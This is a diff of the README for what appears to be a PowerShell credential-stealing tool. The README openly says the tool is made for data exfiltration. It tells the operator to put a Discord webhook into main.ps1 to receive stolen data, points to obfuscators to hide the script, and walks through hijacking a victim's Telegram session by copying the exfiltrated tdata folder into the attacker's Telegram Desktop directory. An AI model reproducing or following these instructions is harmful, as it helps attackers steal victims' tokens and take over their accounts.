@@ -30,7 +30,7 @@ This tool is made for data exfiltration. All information collected is sent using
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line 698 with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line 700 with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
@@ -90,7 +90,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
 ### Telegram Session Stealer Usage :
 After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, extract it on your PC, inside that folder there will also be another subfolder ```Messaging Sessions``` , inside this subfolder you will find the ```Telegram``` folder.
-Now, copy the tdata folder and paste it in the directory below:
+Now, copy the tdata folder from ```Telegram``` folder and paste it in the directory below:
 
 ```
 %userprofile%\AppData\Roaming\Telegram Desktop
